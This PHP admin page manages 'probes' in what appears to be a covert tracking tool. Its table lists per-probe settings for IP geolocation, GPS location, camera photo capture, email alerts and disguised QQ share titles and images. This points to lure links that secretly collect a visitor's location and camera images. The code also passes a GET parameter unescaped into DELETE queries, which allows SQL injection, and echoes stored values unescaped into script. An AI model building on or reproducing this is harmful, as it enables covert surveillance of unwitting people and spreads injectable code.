<?php include_once("../include/backstage/header.php"); ?>
<?php
if($admin_login!="true"){
include_once("../include/backstage/footer.php");
exit('<script>
		layui.use("layer", function(){
			var layer = layui.layer;
			
		layer.open({
			title: "提示"
			,content:"您还未登录"
			
				,yes: function(index, layero){
				window.location.href="/admin/login_admin.php";
					layer.close(index);
					}
				
				,cancel: function(index, layero){ 
				window.location.href="/admin/login_admin.php";
					layer.close(index);
				}  
			
		});     
		
		}); 						
		</script>');
}
?>
<fieldset class="layui-elem-field">
  <legend>探针管理</legend>
	<div class="layui-field-box">
<?php
$row=$DB->query("select*from list_probe");
while($rows = $DB->fetch($row))
	 {
	$data_list_probe= '
	 {
	 				"id":"'.$rows['id'].'"'.
	 				',"key":"'. $rows['key_probe'].'"'.
					',"probe_page":"'. $rows['probe_page'].'"'.
					',"ip_location_function":"'. $rows['ip_location_function'].'"'.
					',"gps_location_function":"'. $rows['gps_location_function'].'"'.
					',"camera_img_function":"'. $rows['camera_img_function'].'"'.
					',"email_notification_function":"'. $rows['email_notification_function'].'"'.
					',"email":"'. $rows['email'].'"'.
					',"qqshare_title":"'. $rows['qqshare_title'].'"'.
					',"qqshare_pics":"'. $rows['qqshare_pics'].'"'.
				',"qqshare_summary":"'. $rows['qqshare_summary'].'"'.
			',"qqshare_desc":"'. $rows['qqshare_desc'].'"'.
	 			'},'.$data_list_probe;
}
$data_list_probe = substr($data_list_probe,0,strlen($data_list_probe)-1); 
echo'
<table class="layui-hide" id="list_probe" lay-filter="list_probe"></table>
<script id="table_button" type="text/html">
<a class="layui-btn layui-btn-xs" lay-event="details">详情</a>
<a class="layui-btn layui-btn-danger layui-btn-xs" lay-event="del">删除</a>
</script>
<script>
layui.use("table", function(){
  var table = layui.table;
  
  //展示已知数据
  table.render({
    elem: "#list_probe"
    ,cols: [[ //标题栏
      {field: "id", title: "ID", width: 70, sort: true}
      ,{field: "key", title: "密钥", width: 96}
      ,{field: "probe_page", title: "页面", width: 110}
      ,{field: "ip_location_function", title: "IP定位功能", width: 100}
      ,{field: "gps_location_function", title: "GPS定位功能", width: 120}
      ,{field: "camera_img_function", title: "摄像头图片功能", width: 130}
	  ,{field: "email_notification_function", title: "邮件通知功能", width: 120}
	  ,{field: "email", title: "电子邮件", width: 100}
      ,{field: "qqshare_title", title: "QQ分享标题", width: 68}
	  ,{field: "qqshare_pics", title: "QQ分享图片", width: 68}
      ,{field: "qqshare_summary", title: "QQ分享描述", width: 68}
      ,{field: "qqshare_desc", title: "QQ分享描述", width: 68}
 ,{field: "action", title: "操作",toolbar: "#table_button", width: 113}
    ]]
    ,data: ['.$data_list_probe
.']
    //,skin: "line" //表格风格
    ,even: true
    ,page: true //是否显示分页
    //,limits: [5, 7, 10]
    ,limit: 10 //每页默认显示的数量
  });
	
	table.on("tool(list_probe)", function(obj){
		var data = obj.data;
		key=data["key"];
		if(obj.event === "del"){
			window.location.href=window.location.protocol+"//"+window.location.hostname+"/admin/probe_manage.php?action=del_probe&key="+key;
			}
		else if(obj.event === "details"){
			window.location.href=window.location.protocol+"//"+window.location.hostname+"/admin/probe_details.php?key="+key;
			
		}
	});
	
});
</script>';
?>
 </div>
</fieldset>
<?php
$action=$_GET['action'];
$key=$_GET['key'];
if($action=="del_probe" and $admin_login=="true"){
		$sql="DELETE FROM list_probe WHERE key_probe='$key' limit 1";
		$DB->query($sql);
		$sql="DELETE FROM list_ip WHERE key_ip='$key' limit 1";
		$DB->query($sql);
		echo '
		<script>
				layui.use("layer", function(){
					var layer = layui.layer;
					
				layer.open({
					title: "提示"
					,content:"删除成功"
					
						,yes: function(index, layero){
						window.location.href="/admin/manage_probe.php";
							layer.close(index);
							}
						
						,cancel: function(index, layero){ 
						window.location.href="/admin/manage_probe.php";
							layer.close(index);
						}  
					
				});     
				
				}); 						
				</script>
		';
	
	
}
?>
<?php include_once("../include/backstage/footer.php"); ?>